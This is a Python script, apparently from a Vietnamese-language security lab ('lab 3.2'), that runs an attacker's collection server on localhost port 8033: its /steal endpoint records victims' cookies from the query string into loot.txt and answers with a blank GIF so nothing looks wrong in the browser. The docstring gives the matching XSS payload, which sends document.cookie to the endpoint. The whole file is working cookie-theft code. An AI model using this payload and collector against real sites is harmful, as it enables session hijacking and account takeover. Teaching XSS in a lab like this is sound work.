#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Server cua ke tan cong cho lab 3.2. Lang nghe 127.0.0.1:8033.
Endpoint /steal nhan cookie nan nhan qua query string va ghi ra file loot.txt.

Payload XSS trong comment se goi:
    new Image().src = 'http://127.0.0.1:8033/steal?c=' + encodeURIComponent(document.cookie)
tuc la trinh duyet nan nhan tu dong gui cookie ve day.
"""
import os
import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote

PORT = 8033
LOOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot.txt")


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/steal":
            qs = parse_qs(parsed.query)
            cookie = unquote(qs.get("c", [""])[0])
            line = "[{ts}] from={ip} cookie={cookie}".format(
                ts=datetime.datetime.utcnow().isoformat() + "Z",
                ip=self.client_address[0],
                cookie=cookie,
            )
            with open(LOOT, "a", encoding="utf-8") as f:
                f.write(line + "\n")
            print("[attacker] THU DUOC: " + line, flush=True)
            # Tra ve anh 1x1 gif de trinh duyet nan nhan khong bao loi.
            gif = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!"
                   b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
                   b"\x00\x00\x02\x02D\x01\x00;")
            self.send_response(200)
            self.send_header("Content-Type", "image/gif")
            self.send_header("Content-Length", str(len(gif)))
            self.end_headers()
            self.wfile.write(gif)
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *args):
        pass  # tat log mac dinh cho gon


if __name__ == "__main__":
    # Xoa loot cu de transcript sach.
    if os.path.exists(LOOT):
        os.remove(LOOT)
    srv = HTTPServer(("127.0.0.1", PORT), Handler)
    print("[attacker] lang nghe http://127.0.0.1:{}/steal, ghi vao {}".format(PORT, LOOT), flush=True)
    srv.serve_forever()
